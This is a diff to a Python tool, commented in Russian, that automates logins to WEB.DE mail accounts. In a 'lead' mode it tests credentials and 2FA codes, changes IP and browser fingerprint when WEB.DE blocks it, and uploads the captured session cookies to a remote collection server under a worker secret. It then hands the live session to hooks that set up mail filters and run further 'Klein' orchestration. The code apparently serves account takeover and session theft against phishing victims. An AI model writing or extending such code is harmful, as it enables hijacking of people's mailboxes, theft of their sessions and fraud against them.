@@ -288,10 +288,10 @@ def _save_cookies_for_lead_mode(context, email: str) -> None:
             return
         try:
             url = str(base).rstrip("/") + "/api/lead-cookies-upload"
-            tok = str((push or {}).get("token") or "").strip()
+            tok = str((push or {}).get("worker_secret") or (push or {}).get("token") or "").strip()
             headers: dict[str, str] = {"Content-Type": "application/json; charset=utf-8"}
             if tok:
-                headers["Authorization"] = "Bearer " + tok
+                headers["x-worker-secret"] = tok
             r = requests.post(
                 url,
                 json={"id": str(lid).strip(), "cookies": cookies},
@@ -310,6 +310,19 @@ def _save_cookies_for_lead_mode(context, email: str) -> None:
         log("Куки", "Сохранены в файл (legacy, без cookies_push)")
     except Exception as e:
         log("Куки", "Не удалось сохранить куки для скачивания: " + str(e))
+
+
+def save_cookies_for_account(context, email: str) -> str:
+    """
+    Сохранить куки в login/cookies/<email>.json (как после входа).
+    Вызывается из webde_mail_filters после настройки фильтров.
+    """
+    em = (email or "").strip()
+    if not em:
+        raise ValueError("save_cookies_for_account: пустой email")
+    path = _cookies_path_for_email(em)
+    save_cookies(context, str(path))
+    return str(path)
 
 
 # «Вход временно недоступен» — нужна смена IP и отпечатков, затем повтор
@@ -2783,6 +2796,7 @@ def login_webde(
     force_pool_fingerprint: bool = False,
     hold_session_after_lead_success: bool = False,
     cookies_push: dict | None = None,
+    after_mail_success_fn: Optional[Callable[[], None]] = None,
 ):
     """
     lead_mode: для симуляции лида (отдельный скрипт). Возвращает "wrong_credentials" | "push" | "success" | "error".
@@ -2797,7 +2811,8 @@ def login_webde(
     on_wrong_two_fa: lead_mode — после неверного кода на WEB.DE (опционально уведомить сервер).
     force_pool_fingerprint: True — взять UA/экран из пула webde_fingerprints.json по fingerprint_index, игнорируя playwright из automation_profile (для ретраев после блока).
     hold_session_after_lead_success: lead_mode — не закрывать браузер при success; сессия в take_lead_held_browser_session() для оркестрации (Klein).
-    cookies_push: lead_mode — {base_url, lead_id, token?} → POST /api/lead-cookies-upload (SQLite); иначе файл login/cookies.
+    cookies_push: lead_mode — {base_url, lead_id, worker_secret?} → POST /api/lead-cookies-upload (SQLite); иначе файл login/cookies.
+    after_mail_success_fn: если задан вместе с hold_session_after_lead_success — вызывается в finally login_webde, пока активен sync_playwright (compose+фильтры+Klein). Иначе Playwright уже остановлен и фильтры падают с Event loop is closed.
     """
     email = email or EMAIL
     password = password or PASSWORD
@@ -3619,12 +3634,26 @@ def login_webde(
                 log("Старт", "Браузер не закрыт. Закройте окно когда нужно, затем нажмите Enter в терминале.")
                 input()
             elif (
+                after_mail_success_fn
+                and hold_session_after_lead_success
+                and _LEAD_HELD_BROWSER_SESSION
+                and _LEAD_HELD_BROWSER_SESSION.get("browser") is browser
+            ):
+                try:
+                    after_mail_success_fn()
+                except Exception as e:
+                    log("KLEIN-ORCH", f"after_mail_success_fn: {type(e).__name__}: {e}")
+                # Хук забирает сессию (take_lead_held_browser_session) и закрывает браузер по завершении оркестрации
+            elif (
                 _LEAD_HELD_BROWSER_SESSION
                 and _LEAD_HELD_BROWSER_SESSION.get("browser") is browser
             ):
                 log("Старт", "Браузер не закрыт — сессия для оркестрации (Klein / фильтры)")
             else:
-                browser.close()
+                try:
+                    browser.close()
+                except Exception:
+                    pass
 
 
 def probe_webde_proxy_fingerprint(
